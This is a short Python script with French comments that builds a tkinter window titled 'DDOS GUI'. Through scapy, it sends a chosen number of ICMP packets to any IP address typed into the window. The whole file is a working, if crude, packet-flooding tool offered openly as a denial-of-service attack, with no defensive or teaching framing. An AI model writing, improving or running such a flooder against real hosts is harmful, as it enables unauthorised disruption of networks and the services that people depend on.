import tkinter as tk
from scapy.all import *

def envoyer_ping():
    ip_dest = entry_ip.get()
    count = int(entry_count.get())
    for i in range(count):
        packet = IP(dst=ip_dest)/ICMP()
        send(packet)
    label_status.config(text=f"Envoi de {count} ping(s) à {ip_dest}")

# Création de la fenêtre
root = tk.Tk()
root.title("DDOS GUI")

# Adresse IP cible
tk.Label(root, text="Adresse IP:").grid(row=0, column=0)
entry_ip = tk.Entry(root)
entry_ip.grid(row=0, column=1)

# Nombre de paquets
tk.Label(root, text="Nombre de paquets:").grid(row=1, column=0)
entry_count = tk.Entry(root)
entry_count.insert(0, "1")
entry_count.grid(row=1, column=1)

# Bouton pour envoyer
btn_envoyer = tk.Button(root, text="Envoyer Ping", command=envoyer_ping)
btn_envoyer.grid(row=2, column=0, columnspan=2)

# Label pour le statut
label_status = tk.Label(root, text="")
label_status.grid(row=3, column=0, columnspan=2)

root.mainloop()
